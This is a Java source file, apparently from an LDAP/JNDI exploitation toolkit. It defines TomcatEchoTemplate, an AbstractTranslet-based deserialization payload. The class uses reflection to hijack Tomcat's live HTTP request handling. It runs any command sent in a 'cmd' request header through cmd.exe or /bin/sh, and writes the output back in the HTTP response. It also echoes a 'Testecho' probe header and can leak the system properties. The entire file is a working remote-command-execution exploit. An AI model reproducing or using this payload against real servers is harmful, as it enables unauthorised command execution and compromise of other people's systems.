package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class TomcatEchoTemplate extends AbstractTranslet {

    public TomcatEchoTemplate(){
        try{
            boolean var4 = false;
            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");

            for(int var6 = 0; var6 < var5.length; ++var6) {
                Thread var7 = var5[var6];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {
                                continue;
                            }

                            List var9 = (List)getFV(var1, "processors");

                            for(int var10 = 0; var10 < var9.size(); ++var10) {
                                Object var11 = var9.get(var10);
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Testecho");
                                if (var3 != null && !var3.isEmpty()) {
                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                                    var2.getClass().getMethod("addHeader", String.class, String.class).invoke(var2, "Testecho", var3);
                                    var4 = true;
                                }

                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "cmd");
                                if (var3 != null && !var3.isEmpty()) {
                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c", var3};
                                    writeBody(var2, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    var4 = true;
                                }

                                if ((var3 == null || var3.isEmpty()) && var4) {
                                    writeBody(var2, System.getProperties().toString().getBytes());
                                }

                                if (var4) {
                                    break;
                                }
                            }

                            if (var4) {
                                break;
                            }
                        }
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }

    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
